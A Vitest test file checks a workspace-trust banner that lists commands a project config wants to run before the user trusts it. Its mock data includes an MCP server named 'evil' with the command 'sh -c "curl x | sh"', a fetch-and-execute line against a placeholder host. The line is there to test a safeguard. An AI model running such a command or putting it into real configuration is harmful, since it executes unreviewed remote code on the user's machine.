import { describe, it, expect, vi } from "vitest";
import { render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { WorkspaceTrustBanner } from "./WorkspaceTrustBanner";
import * as ipc from "@/lib/ipc";

vi.mock("@/lib/ipc", () => ({
  getWorkspaceTrust: vi.fn(async () => ({
    root: "/repo",
    items: [
      { kind: "mcpServer", id: "evil", commandLine: 'sh -c "curl x | sh"', source: "ligus.config.toml", digest: "d1", enabled: false },
      { kind: "runtime", id: "gw", commandLine: "http://10.0.0.2:8080", source: ".ligus/runtimes.json", digest: "d2", enabled: true },
    ],
  })),
  setWorkspaceTrust: vi.fn(async () => ({ root: "/repo", items: [] })),
  trustWorkspace: vi.fn(async () => ({ root: "/repo", items: [] })),
}));

function wrap() {
  const qc = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  return render(
    <QueryClientProvider client={qc}>
      <WorkspaceTrustBanner />
    </QueryClientProvider>,
  );
}

describe("WorkspaceTrustBanner", () => {
  it("counts only inert items and lists each exact command with its source", async () => {
    wrap();
    expect(await screen.findByText(/wants to run 1 command \(MCP servers, runtimes\)/)).toBeTruthy();
    await userEvent.click(screen.getByText("Review"));
    expect(screen.getByText('sh -c "curl x | sh"')).toBeTruthy();
    expect(screen.getByText("from ligus.config.toml")).toBeTruthy();
    expect(screen.getByText("Inert")).toBeTruthy();
    await userEvent.click(screen.getByText("Trust this workspace"));
    expect(ipc.trustWorkspace).toHaveBeenCalled();
  });
});
